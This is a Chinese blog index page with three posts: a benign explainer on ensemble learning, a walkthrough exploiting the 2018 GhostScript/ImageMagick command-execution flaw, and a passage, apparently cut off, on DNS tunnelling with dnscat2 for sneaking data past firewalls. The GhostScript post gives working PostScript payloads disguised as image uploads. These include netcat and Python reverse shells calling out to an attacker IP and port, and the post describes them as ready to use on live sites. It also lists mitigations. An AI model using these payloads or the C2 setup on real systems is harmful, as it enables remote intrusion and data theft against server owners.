<!doctype html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.0" />






<meta property="og:type" content="website">
<meta property="og:title" content="Leticia&#39;s Blog">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="Leticia&#39;s Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Leticia&#39;s Blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/3/"/>





  <title> Leticia's Blog </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  














  
  
    
  

  <div class="container sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Leticia's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">She will never see the day it blossoms,maybe.</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/06/机器学习-9-——集成学习/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/09/06/机器学习-9-——集成学习/" itemprop="url">
                  机器学习(9)——集成学习
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-06T16:41:42+08:00">
                2018-09-06
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/09/06/机器学习-9-——集成学习/" class="leancloud_visitors" data-flag-title="机器学习(9)——集成学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在我们设计的机器学习算法性能达到瓶颈却不满足我们的需求时，我们想在单一的学习器上提升精度需要投入大量的资源，很容易得不偿失。这个时候更好的做法是使用一种优化的策略来提升精度，那就是集成学习。</p>
<h2 id="0x01-集成学习"><a href="#0x01-集成学习" class="headerlink" title="0x01 集成学习"></a>0x01 集成学习</h2><p>现实生活中，我们经常会通过投票的方式，以做出更加可靠的决策。集成学习就与此类似。集成学习就是通过构建多个学习器，并通过一定的学习策略将他们结合起来。</p>
<p>集成学习通过将多个学习器进行结合，一般可获得比单一学习器显著优越的泛化性能。</p>
<h2 id="0x02-分类"><a href="#0x02-分类" class="headerlink" title="0x02 分类"></a>0x02 分类</h2><h3 id="以个体学习器的类型分类"><a href="#以个体学习器的类型分类" class="headerlink" title="以个体学习器的类型分类"></a>以个体学习器的类型分类</h3><ul>
<li>在集成中只包含同种类型的个体学习器，被称为同质集成。如：“决策树集成”，“神经网络集成”。</li>
<li>在集成种包含不同种类型的个体学习器，被称为异质集成。如同时包含决策树和神经网络。</li>
</ul>
<h3 id="以个体学习器的生成方式分类"><a href="#以个体学习器的生成方式分类" class="headerlink" title="以个体学习器的生成方式分类"></a>以个体学习器的生成方式分类</h3><ul>
<li>个体学习器之间存在较强的依赖关系，则需要使用串行生成的序列化方法。如：“Boosting”</li>
<li>个体学习器不存在强依赖关系，则可使用同时生成的并行化方法。如：“Bagging”、“随机森林”。</li>
</ul>
<h2 id="0x03-Boosting"><a href="#0x03-Boosting" class="headerlink" title="0x03 Boosting"></a>0x03 Boosting</h2><p>Boosting是一种可将弱学习器提升为强学习器的算法，这种算法的工作机制是先从初始训练集训练出一个基学习器，再根据基学习器的表现对训练样本分布进行调整，使得先前基学习器做错的训练样本在后续获得更多关注，然后基于调整后的样本分布来训练下一个基学习器。如此反复，直至基学习器数目达到我们需要的值，最终将这些基学习器进行加权结合。</p>
<h2 id="0x04-Bagging"><a href="#0x04-Bagging" class="headerlink" title="0x04 Bagging"></a>0x04 Bagging</h2><p>Bagging是并行式集成学习算法最著名的代表，它基于自助采样法，给定包含m个样本的数据集，我们先随机取出一个样本放入采样器中，再把该样本放回数据集，这样下次该样本仍可能被选中，经过m次随机采样操作，我们得到含有m个样本的采样集，初始训练集中有的样本多次出现，有的样本从未出现。</p>
<p>按照这种方法抽样出T个含m个样本的样本集，然后基于每个样本集训练一个基学习器，再将这些基学习器进行结合，就是Bagging。</p>
<h2 id="0x05-随机森林"><a href="#0x05-随机森林" class="headerlink" title="0x05 随机森林"></a>0x05 随机森林</h2><p>随机森林是Bagging的一个扩展变体，随机森林在以决策树为基学习器构建Bagging的基础上，进一步在训练过程中引入随机属性选择。</p>
<p>传统决策树在选择划分属性时是在当前结点的属性集合(共d个)中选择一个最优属性，而随机森林对决策树的每个结点，先从该结点的属性集合中随机选择一个包含k个属性的子集，然后再从这k个属性中选择最优属性进行划分。</p>
<p>很显然，k控制了随机性：</p>
<ul>
<li>如果k和总属性量相同，那就是传统决策树，随机性最低；</li>
<li>如果k=1，则随机选择一个属性用于划分，随机性最高。</li>
</ul>
<p>所以一般情况下，推荐选用k=log2（d）。</p>
<h2 id="0x06-结合策略"><a href="#0x06-结合策略" class="headerlink" title="0x06 结合策略"></a>0x06 结合策略</h2><p>之前多次提到了“结合”一词，但是究竟怎么将多个学习器的结果结合起来，也有很多种不同的策略。</p>
<p>下面给出一些常见的策略</p>
<h3 id="平均法"><a href="#平均法" class="headerlink" title="平均法"></a>平均法</h3><p>对于回归任务的数值型输出，常见的策略是平均法</p>
<h4 id="简单平均法"><a href="#简单平均法" class="headerlink" title="简单平均法"></a>简单平均法</h4><p>简单平均法就是将所有的学习器结果做算数平均，将平均数做为最终结果。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml9_01.png?raw=true" alt=""></p>
<h4 id="加权平均法"><a href="#加权平均法" class="headerlink" title="加权平均法"></a>加权平均法</h4><p>加权平均法是给予每一个学习器不同的权重，加权平均法的权重一般从训练数据中学习得到。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml9_02.png?raw=true" alt=""></p>
<h3 id="投票法"><a href="#投票法" class="headerlink" title="投票法"></a>投票法</h3><p>对于分类任务的标记型输出，常见的策略是投票法</p>
<h4 id="绝对多数投票法（硬投票）"><a href="#绝对多数投票法（硬投票）" class="headerlink" title="绝对多数投票法（硬投票）"></a>绝对多数投票法（硬投票）</h4><p>绝对多数投票法即某标记的得票数过半，则预测为该标记，否则拒绝预测。</p>
<h4 id="相对多数投票法（硬投票）"><a href="#相对多数投票法（硬投票）" class="headerlink" title="相对多数投票法（硬投票）"></a>相对多数投票法（硬投票）</h4><p>相对多数投票法即预测为得票最多的标记，若同时有多个最高票，则从中随机选取一个。</p>
<h4 id="加权投票法（软投票）"><a href="#加权投票法（软投票）" class="headerlink" title="加权投票法（软投票）"></a>加权投票法（软投票）</h4><p>加权投票法会返回预测各个类的概率加权平均值，然后取其中最大平均概率的分类做为预测结果。</p>
<p>可以用表格清晰的表示出来</p>
<table>
<thead>
<tr>
<th>分类器</th>
<th>类别1</th>
<th>类别2</th>
<th>类别3</th>
</tr>
</thead>
<tbody>
<tr>
<td>分类器1</td>
<td>w1*0.2</td>
<td>w1*0.5</td>
<td>w1*0.3</td>
</tr>
<tr>
<td>分类器2</td>
<td>w2*0.6</td>
<td>w2*0.3</td>
<td>w2*0.1</td>
</tr>
<tr>
<td>分类器3</td>
<td>w3*0.3</td>
<td>w2*0.4</td>
<td>w2*0.3</td>
</tr>
</tbody>
</table>
<p>在预测时，计算每一类的加权平均值比较即可。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/22/GhostScript命令执行漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/08/22/GhostScript命令执行漏洞/" itemprop="url">
                  GhostScript命令执行漏洞
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-22T20:33:46+08:00">
                2018-08-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/08/22/GhostScript命令执行漏洞/" class="leancloud_visitors" data-flag-title="GhostScript命令执行漏洞">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天早上 <a href="http://seclists.org/oss-sec/2018/q3/142" target="_blank" rel="noopener">http://seclists.org/oss-sec/2018/q3/142</a> 曝出了这个imageMagick的漏洞，然后下午从朋友那里听说了，这个漏洞影响范围极广，有缩略图功能的各种网站都有机会中招。当时看着大佬们在百度、新浪等各大厂商的src提交漏洞报告薅赏金的时候，自己也想尝试尝试，奈何手边没有电脑，只能等到晚上回来复现。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/GhostScript_rce/rce01.png?raw=true" alt=""></p>
<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><p>GhostScript插件被许多图片处理库如 ImageMagick、Python PIL 等所使用，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括GhostScript。</p>
<p>而GhostScript的安全沙箱可以通过构造恶意代码绕过，当我们构造恶意代码并重命名成图片的格式，上传至目标服务器时，目标服务器的图像处理模块（为了完成如头像缩略图等功能）就会触发构造的恶意代码，造成远程代码执行。</p>
<p>也正是因为使用这些图像处理模块的网站十分多，所以漏洞影响范围极大，对于我们学生党来说，是个刷SRC赚点零花钱的好机会。</p>
<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>作者给出的测试poc有两种，分别针对centos和ubuntu：</p>
<h3 id="For-Ubuntu"><a href="#For-Ubuntu" class="headerlink" title="For Ubuntu"></a>For Ubuntu</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
<p>将这样一张图片上传后，经过GhostScript就会触发id命令</p>
<p>我们在本地可以通过imageMagick的图像压缩功能测试一下，首先安装imageMagick<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install imageMagick</span><br></pre></td></tr></table></figure></p>
<p>然后使用convert命令压缩图片触发命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert shellexe.jpeg whatever.gif</span><br></pre></td></tr></table></figure></p>
<p>显示如下信息说明测试成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)</span><br><span class="line">context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure></p>
<p><img src="https://github.com/echohun/blog_image/blob/master/GhostScript_rce/rce02.png?raw=true" alt=""></p>
<h3 id="For-CentOS"><a href="#For-CentOS" class="headerlink" title="For CentOS"></a>For CentOS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
<p>centos中除了payload不同以外，其他过程都相同，不过安装imageMagicK需要使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install imageMagicK</span><br></pre></td></tr></table></figure></p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>这两种linux系统中都可以验证漏洞存在了，那么我们该如何利用它呢？</p>
<p>虽然我们每次直接改id再上传使服务器执行命令也可以，但是未免太过麻烦，想要方便的控制肯定是得反弹一个shell，我这里提供两种方法：</p>
<h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>第一种是反弹一个netcat的连接，因为大部分的linux都会自带nc，我们只需要将id命令改成反弹一个nc到我们监听的服务器和端口即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%$(nc -e /bin/sh xxx.xxx.xxx.xxx 1234)) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p>
<p>只要将恶意代码中xxx.xxx.xxx.xxx改为自己的ip，将1234改为自己监听的端口就可以使用了。</p>
<h3 id="python-shell"><a href="#python-shell" class="headerlink" title="python shell"></a>python shell</h3><p>当然也不排除一些服务器没有nc，这种时候就用第二种方法：反弹一个python shell，linux中基本都是装了python的</p>
<p>python版本的shell编写可以参考我前面的博客 </p>
<p>我这里也给出一个直接可以利用的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.100&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p>
<p>上述两种方法都还需要我们在自己远程监听的服务器上打开一个nc的监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 2333</span><br></pre></td></tr></table></figure></p>
<p>然后上传图片，如果攻击成功就可以得到shell：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/GhostScript_rce/rce03.png?raw=true" alt=""></p>
<p><img src="https://github.com/echohun/blog_image/blob/master/GhostScript_rce/rce04.png?raw=true" alt=""></p>
<h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><p>暂时官方没有补丁，可以参考长亭安全团队给出的临时解决方案：</p>
<ul>
<li><p>1.卸载 GhostScript<br>以 Ubuntu 系统为例，执行以下命令以卸载 GhostScript：<br>sudo apt-get remove ghostscript</p>
</li>
<li><p>2.修改 ImageMagick 的 policy 文件，默认位置为 /etc/ImageMagick/policy.xml，在 <policymap> 中加入以下 <policy>（即禁用 PS、EPS、PDF、XPS coders）：</policy></policymap></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;policymap&gt;</span><br><span class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PS&quot; /&gt;</span><br><span class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPS&quot; /&gt;</span><br><span class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PDF&quot; /&gt;</span><br><span class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;XPS&quot; /&gt;</span><br><span class="line">&lt;/policymap&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>不过很快官方补丁就会给出，那时就可以直接更新imageMagicK</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/07/利用DNS-Tunnel传输数据/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/08/07/利用DNS-Tunnel传输数据/" itemprop="url">
                  利用DNS Tunnel传输数据
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-07T10:37:51+08:00">
                2018-08-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/08/07/利用DNS-Tunnel传输数据/" class="leancloud_visitors" data-flag-title="利用DNS Tunnel传输数据">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当一些服务器被黑客非法入侵之后，黑客都是以从入侵中获益作为目标，而最大的获益方式就是偷取高价值的数据，所以大部分公司也会为了高价值的数据保护设下层层防火墙以及加密，让核心资产偷不走、解不开、用不了。</p>
<p>其中“偷不走”这步，一般都是对出站的流量做很严格的限制，并且加上很多的报警规则，这样即使入侵进去，也很难建立一个通道将核心资产偷走。</p>
<p>但是防御这件事情，不能因噎废食，服务器不能因为有潜在的风险就把所有的通道都限制掉，就比如服务器需要允许至少对一个服务器的DNS请求，在这个前提下，就有大牛想出通过DNS Tunnel外发数据，避过防火墙来外发数据。</p>
<h2 id="0x01-DNS"><a href="#0x01-DNS" class="headerlink" title="0x01 DNS"></a>0x01 DNS</h2><p>DNS（Domain Name System，域名系统），万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。</p>
<h2 id="0x02-DNS-Tunnel"><a href="#0x02-DNS-Tunnel" class="headerlink" title="0x02 DNS Tunnel"></a>0x02 DNS Tunnel</h2><p>DNS Tunnel，是隐蔽信道的一种，通过将其他协议封装在DNS协议中传输建立通信。</p>
<p>DNS Tunnel可以分为直连和中继两种。</p>
<p>直连也就是用目标服务器直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度快，但是隐蔽性比较弱，很容易被探测到，另外限制比较高，很多场景不允许自己指定DNS Server。</p>
<p>中继是通过DNS迭代查询而实现的中继隧道，则更为隐秘，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多。</p>
<p>中继过程中的一个关键点是对DNS缓存机制的规避，因为如果需要解析的域名在Local DNS Server中已经有缓存时，Local DNS Server就不会转发数据包。所以在我们构造的请求中，每次查询的域名都是不一样的或者是已经是过期的。</p>
<p>对DNS载荷的编码是DNS Tunnel的另一个核心技术。从高层来看，载荷只是客户端和服务器通信的正常流量。例如客户端发送一个A记录请求给服务器，查询的主机名为 2roAUwBaCGRuc3R1bm5lbGluZwo.test.domain.com,其中2roAUwBaCGRuc3R1bm5lbGluZwo则是客户端传递给服务器的信息，这串字符解码后的信息便是dns tunnel。</p>
<p>大多数场景下，内网的Client位于防火墙后，Server不可能发起连接。所以Client会定时向Server发送请求，保证二者之间的通信状态。</p>
<h2 id="0x03-使用dnscat2工具实现"><a href="#0x03-使用dnscat2工具实现" class="headerlink" title="0x03 使用dnscat2工具实现"></a>0x03 使用dnscat2工具实现</h2><p>Dnscat2的定位是一个封装在DNS协议中加密的命令与控制(C&amp;C)信道。它同样是C/S架构，Client由c编写，server由ruby编写。Client位于感染主机，而Server位于权威域名服务器上，如果没有权威域名服务器，则可以采用直连模式。</p>
<p>为了直接达到能拿出来用的效果，我就使用实际场景搭建了，应用于实际场景我们需要一台公网服务器、一个域名、还有dnscat2程序。</p>
<p>公网服务器作为server端，我建议使用ubuntu或者高版本centos（低版本的centos会出现一些小问题，如果比较熟悉ruby和gem挺容易解决的，我这里使用ubuntu演示，没有太多经验的可以跟着我使用ubuntu来现尝试一下）</p>
<p>server使用如下代码安装需要的环境，然后使用git下载dnscat2进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ruby ruby-dev git make g++ rubygems</span><br><span class="line">gem update --system</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure></p>
<p>出现几行绿色字体如下所示就代表安装完成了：</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns01.png?raw=true" alt=""></p>
<p>然后我们需要在域名解析服务器上这样伪造，设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址。如下图的设置，打码部分是服务器ip地址。</p>
<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns02.png?raw=true" alt=""></p>
<p>client如果是linux，就使用git下载dnscat2源码，然后编译dnscat2/client文件夹中的c文件</p>
<p>linux-client端部署代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/client/</span><br><span class="line">make</span><br></pre></td></tr></table></figure></p>
